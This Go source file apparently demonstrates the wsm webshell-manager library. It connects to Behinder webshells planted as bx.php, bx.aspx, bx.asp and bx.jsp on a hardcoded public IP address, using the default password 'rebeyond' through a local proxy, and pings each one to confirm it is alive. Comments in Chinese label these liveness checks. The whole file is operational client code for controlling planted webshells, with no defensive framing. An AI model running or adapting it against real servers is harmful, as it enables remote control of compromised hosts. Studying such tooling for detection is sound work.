package main

import (
	"fmt"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/shell"
	"log"
)

func main() {
	jspPing()
	aspPing()
	aspxPing()
	phpPing()
}

func phpPing() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86/bx.php",
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	// 验证存活
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func aspxPing() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.aspx",
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	// 验证存活
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func aspPing() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.asp",
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	// 验证存活
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func jspPing() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	// 验证存活
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}
